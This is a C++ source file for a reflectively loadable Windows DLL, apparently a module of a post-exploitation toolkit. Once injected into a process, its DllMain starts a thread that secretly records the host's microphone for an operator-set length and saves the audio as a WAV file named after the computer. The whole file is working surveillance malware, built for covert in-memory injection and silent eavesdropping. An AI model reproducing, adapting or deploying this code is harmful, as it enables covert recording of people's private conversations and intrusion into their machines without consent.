#include "FileTunnel.h"
#include "ReflectiveLoader.h"
#include <windows.h>
#include <string>
#include <algorithm>
#include <sstream>
#include <tchar.h>

std::string hostname()
{
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	GetComputerNameA(hostname, &hlen);
	return std::string(hostname);

}

void RecordMic()
{
    int Len = atoi(GetInputOutput());
	std::ostringstream micrecfile;
	std::string MICFILENAME = hostname() + ".wav";
	micrecfile << "save lunar " << MICFILENAME;
	mciSendString(_T("open new type waveaudio alias lunar"), NULL, 0, NULL);
	mciSendString(_T("set lunar time format ms"), NULL, 0, NULL);
	mciSendString(_T("record lunar notify"), NULL, 0, NULL);
	Sleep(Len); // Sleep() here is how long the recording will be
	mciSendString(_T("stop lunar"), NULL, 0, NULL);
	mciSendStringA(micrecfile.str().c_str(), NULL, 0, NULL);
	mciSendString(_T("close lunar"), NULL, 0, NULL);
}


extern HINSTANCE hAppInstance;
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecordMic, NULL, 0 , NULL);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}